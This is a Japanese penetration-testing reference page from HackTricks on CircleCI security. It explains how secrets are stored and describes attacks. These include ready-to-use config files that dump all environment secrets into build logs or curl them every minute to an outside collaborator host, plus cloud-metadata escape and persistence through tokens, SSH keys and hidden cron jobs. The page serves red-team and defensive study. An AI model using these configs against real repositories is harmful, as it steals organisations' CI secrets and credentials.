# CircleCI セキュリティ

<details>

{% hint style="success" %}
AWS ハッキングの学習と実践:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP ハッキングの学習と実践: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks のサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** をフォローしてください。**
* **HackTricks** と **HackTricks Cloud** の github リポジトリに PR を提出して **ハッキングトリックを共有**してください。

</details>
{% endhint %}

## 基本情報

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) は、**何を行い、いつ行うかを示すテンプレートを定義**できる**継続的インテグレーションプラットフォーム**です。これにより、**テストを自動化**したり、**リポジトリのマスターブランチから直接デプロイ**したりできます。

## 権限

**CircleCI** は、ログインしている **アカウント** に関連する github と bitbucket から**権限を継承**します。\
私のテストでは、github のリポジトリに **書き込み権限** がある限り、**CircleCI のプロジェクト設定を管理**できることを確認しました（新しい ssh キーを設定したり、プロジェクト api キーを取得したり、新しい CircleCI 設定を持つ新しいブランチを作成したり...）。

ただし、リポジトリを CircleCI プロジェクトに変換するには、**リポジトリの管理者**である必要があります。

## 環境変数とシークレット

[**ドキュメント**](https://circleci.com/docs/2.0/env-vars/)によると、ワークフロー内で**環境変数に値をロード**するための異なる方法があります。

### 組み込み環境変数

CircleCI によって実行されるすべてのコンテナには、常に[**ドキュメントで定義された特定の環境変数**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)が含まれます。例: `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME`, `CIRCLE_USERNAME`。

### 平文

**コマンド**内で平文で宣言することができます。
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**run environment** 内で明確なテキストで宣言することができます。
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job environment** 内で明確なテキストで宣言することができます。
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**コンテナの環境**内で明確なテキストで宣言することができます。
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### プロジェクトの秘密

これらはプロジェクトによってのみアクセス可能な**秘密**です（どのブランチでも）。\
これらは_https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_で宣言されているのを見ることができます。

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**Import Variables**"機能を使用すると、他のプロジェクトからこのプロジェクトに変数を**インポート**できます。
{% endhint %}

### コンテキストの秘密

これらは**組織全体**で共有される秘密です。**デフォルトではどのリポジトリ**もここに保存された秘密にアクセスできます。

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
ただし、異なるグループ（すべてのメンバーの代わりに）を**選択して、特定の人にのみ秘密へのアクセス権を与える**ことができます。\
これは現在、秘密のセキュリティを**向上させる最良の方法**の1つであり、誰もがアクセスできるのではなく、一部の人だけがアクセスできるようにします。
{% endhint %}

## 攻撃

### 明文テキストの秘密を検索

VCS（githubなど）への**アクセス**がある場合、各リポジトリの各ブランチの`.circleci/config.yml`ファイルをチェックし、そこに保存されている潜在的な**明文テキストの秘密**を**検索**します。

### Secret Env Vars＆コンテキストの列挙

コードをチェックすると、各`.circleci/config.yml`ファイルで使用されている**すべての秘密の名前**を見つけることができます。また、これらのファイルから**コンテキストの名前**を取得するか、Webコンソールで確認できます：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### プロジェクトの秘密を外部流出

{% hint style="warning" %}
プロジェクトとコンテキストの**すべての秘密を外部流出**するには、github組織全体の**1つのリポジトリ**に**書き込みアクセス**が必要です（_そしてあなたのアカウントはデフォルトで誰もがすべてのコンテキストにアクセスできるようにする必要があります_）。
{% endhint %}

{% hint style="danger" %}
"**Import Variables**"機能を使用すると、他のプロジェクトからこのプロジェクトに変数を**インポート**できます。したがって、攻撃者は**すべてのリポジトリからすべてのプロジェクト変数をインポート**し、それらを**一緒に外部流出**することができます。
{% endhint %}

すべてのプロジェクトの秘密は常にジョブの環境に設定されているため、envを呼び出してそれをbase64で難読化するだけで、秘密が**ワークフローのWebログコンソール**に外部流出します：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
もし **webコンソールにアクセスできない** が **リポジトリにアクセスでき** 、CircleCIが使用されていることを知っている場合は、単に **1分ごとにトリガーされるワークフロー** を **作成して**、**シークレットを外部アドレスに持ち出す**ことができます:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### コンテキストのシークレットを外部に流出させる

**コンテキスト名を指定する必要があります**（これによりプロジェクトのシークレットも外部に流出します）:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
もしWebコンソールにアクセスできないが、リポジトリにアクセスでき、CircleCIが使用されていることを知っている場合、**1分ごとにトリガーされるワークフローを変更**して、**シークレットを外部アドレスに送信**することができます。
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
新しい`.circleci/config.yml`をリポジトリに作成するだけでは、**CircleCIのビルドをトリガーするには十分ではありません**。**CircleCIコンソールでプロジェクトとして有効にする必要があります**。
{% endhint %}

### クラウドへの脱出

**CircleCI** は、**彼らのマシンまたはあなた自身のマシンでビルドを実行するオプション**を提供します。\
デフォルトでは、彼らのマシンはGCPにあり、最初は関連する情報を見つけることはできません。ただし、被害者が**自分自身のマシンでタスクを実行している場合（おそらく、クラウド環境で）**、**興味深い情報が含まれているクラウドメタデータエンドポイント**を見つけることができるかもしれません。

前の例ではすべてがDockerコンテナ内で起動されましたが、**VMマシンを起動するように依頼することもできます**（異なるクラウド権限を持っている可能性があります）:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
またはリモートDockerサービスへのアクセス権を持つDockerコンテナ：
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 持続性

* **CircleCIでユーザートークンを作成**して、ユーザーアクセスでAPIエンドポイントにアクセスすることが可能です。
* _https://app.circleci.com/settings/user/tokens_
* プロジェクトトークンを作成して、トークンに与えられた権限でプロジェクトにアクセスすることが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* プロジェクトにSSHキーを追加することが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 予期しないプロジェクトの隠しブランチに**クロンジョブを作成**して、毎日すべての**コンテキスト環境変数を漏洩**させることが可能です。
* または、既知のジョブをブランチに作成/変更して、毎日すべてのコンテキストと**プロジェクトのシークレットを漏洩**させることが可能です。
* GitHubの所有者であれば、**未検証のorbを許可**し、ジョブで**バックドア**として構成することが可能です。
* 特定のタスクで**コマンドインジェクションの脆弱性**を見つけ、その値を変更して**シークレットを注入**することが可能です。
